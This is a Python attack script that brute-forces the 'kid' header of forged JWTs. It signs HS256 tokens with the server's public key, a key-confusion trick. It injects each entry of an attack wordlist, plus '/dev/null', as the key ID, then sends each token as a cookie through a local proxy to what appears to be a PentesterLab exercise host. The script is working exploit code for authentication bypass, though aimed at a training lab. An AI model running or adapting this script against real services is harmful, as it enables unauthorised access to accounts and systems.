import jwt
import json
from codecs import encode, decode
import requests
import hashlib
import hmac
import base64
from os import listdir
from os.path import isfile, join
import copy

print("----- PARAMS -----")

proxies = {
  'http': 'http://192.168.68.104:8080',
  'https': 'http://192.168.68.104:8080',
}
print (proxies)
injections = open('/wordlists/Injections/All_attack.txt', 'r').readlines()

public = open('data/public.pem', 'rb').read()
print (public)

payload = open('data/payload.json', 'rb').read()
print (payload)
payload = base64.urlsafe_b64encode(payload).rstrip(b"=")

sample_header = json.loads('{"typ":"JWT","alg":"HS256","kid":"0001"}')
print(sample_header)

print("----- BRUTE -----")

def create_token(kid):
    # create an appropriate JSON object for header
    header = copy.deepcopy(sample_header)
    header['kid'] = kid
    header = json.dumps(header).encode()
    header = base64.urlsafe_b64encode(header).rstrip(b"=")

    # sign the payload
    sig = hmac.new(public, header + b'.' + payload, hashlib.sha256).digest().strip()
    sig = base64.urlsafe_b64encode(sig).rstrip(b"=")

    # print the json token
    encoded = '{}.{}.{}'.format(header.decode(), payload.decode(), sig.decode())
    # print(encoded)
    return encoded

def send_http(token):
    headers = {
        'Host': 'ptl-37e6aa20-b1faf840.libcurl.so',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'Connection': 'close',
        'Cookie': 'auth=' + token
    }
    response = requests.get(
        'http://ptl-37e6aa20-b1faf840.libcurl.so/',
        params=None,
        headers=headers,
        proxies=proxies
    )
    return response.status_code

# Sample
send_http('eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IjAwMDEifQ.eyJ1c2VyIjpudWxsfQ.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y')

# Try all injections
# - Add a few extra items if needed
injections = [
    '/dev/null'
] + injections 
for injection in injections:
    # Clean wordlist a bit...
    injection = injection.strip('\n')
    if injection is None or injection == "":
        continue
    # Generate JWT
    token = create_token(injection.strip('\n'))
    status = send_http(token)
    if status != 500:
        print(injection)
        print(token)
        print(status)
        print("")